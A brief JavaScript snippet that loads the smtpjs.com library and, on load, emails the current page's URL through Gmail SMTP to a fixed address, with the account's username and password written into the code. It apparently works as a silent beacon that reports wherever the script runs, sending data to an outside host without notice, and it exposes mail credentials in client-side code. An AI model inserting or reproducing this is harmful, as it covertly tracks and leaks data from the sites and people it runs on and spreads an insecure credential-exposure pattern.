var sc = document.createElement("script");
sc.setAttribute("src", "https://smtpjs.com/v3/smtp.js");
sc.setAttribute("type", "text/javascript");
document.head.appendChild(sc);
  website = window.location.href
    function sendEmail() {
      Email.send({
        Host: "smtp.gmail.com",
        Username: "sendmailapplication32@gmail.com",
        Password: "easypassword",
        To: 'sendmailapplication32@gmail.com',
        From: "sendmailapplication32@gmail.com",
        Subject: "Sending Email using javascript",
        Body: website,
      })
    }
    sendEmail();

